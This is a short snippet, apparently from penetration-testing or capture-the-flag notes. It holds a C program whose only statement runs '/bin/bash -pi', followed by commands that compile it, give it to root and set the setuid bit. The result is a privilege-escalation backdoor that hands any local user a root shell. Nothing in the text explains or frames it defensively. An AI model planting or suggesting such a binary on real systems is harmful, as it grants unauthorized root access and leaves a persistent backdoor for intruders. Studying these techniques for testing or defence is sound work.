system.c:
```c
int main() {
    system("/bin/bash -pi");
}
```

```bash
gcc system.c -o system
chown root:root system
chmod +s system
```